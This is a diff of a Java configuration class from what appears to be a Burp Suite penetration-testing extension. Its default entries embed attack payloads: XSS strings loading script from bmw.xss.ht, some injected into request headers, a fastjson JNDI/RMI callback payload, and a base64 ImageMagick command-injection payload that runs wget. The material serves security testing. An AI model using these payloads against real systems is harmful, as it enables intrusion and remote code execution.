@@ -22,7 +22,7 @@ public class ConfigTableModel extends AbstractTableModel{
 	 * LineTableModel中数据如果类型不匹配，或者有其他问题，可能导致图形界面加载异常！
 	 */
 	private static final long serialVersionUID = 1L;
-	private List<ConfigEntry> configEntries =new ArrayList<ConfigEntry>();
+	private List<ConfigEntry> configEntries = new ArrayList<>();
 	public static final String[] titles = new String[] {
 			"#", "Key", "Value", "Type", "Enable", "Comment"
 	};
@@ -54,8 +54,8 @@ public class ConfigTableModel extends AbstractTableModel{
 		//configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
 
-		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Config_Basic_Variable,true,false));
-		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Config_Basic_Variable,true,false));
+		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Run_External_Cmd,true,false));
+		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Run_External_Cmd,true,false));
 		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
 			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,Robot_Input_Comment));
 		}else {
@@ -77,10 +77,10 @@ public class ConfigTableModel extends AbstractTableModel{
 
 		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true,true));
 		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
-		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Append_To_header_value,true,true));
+		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src={dnslogserver}/{host}>",ConfigEntry.Action_Append_To_header_value,true,true));
 		//configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
-		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.%dnslogserver/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
+		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{host}.fastjson.{dnslogserver}/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
 
 		configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
 
@@ -112,7 +112,7 @@ public class ConfigTableModel extends AbstractTableModel{
 
 	public List<ConfigEntry> getConfigByType(String type) {
 
-		List<ConfigEntry> result = new ArrayList<ConfigEntry>();
+		List<ConfigEntry> result = new ArrayList<>();
 		for (ConfigEntry entry:configEntries) {
 			if (entry.getType().equals(type) && entry.isEnable()) {
 				result.add(entry);
@@ -149,6 +149,19 @@ public class ConfigTableModel extends AbstractTableModel{
 		return null;
 	}
 
+	/**
+	 * 用于构建最终配置value，比如{host} {dnslogserver}等等
+	 * @return
+	 */
+	public List<ConfigEntry> getBasicConfigVars(){
+		List<ConfigEntry> result = new ArrayList<>();
+		for (ConfigEntry entry:configEntries) {
+			if (entry.isEnable() && entry.getType().equals(ConfigEntry.Config_Basic_Variable) ) {
+				result.add(entry);
+			}
+		}
+		return result;
+	}
 	public Set<String> getConfigValueSetByKey(String key) {
 		Set<String> result = new HashSet<>();
 		for (ConfigEntry entry:configEntries) {
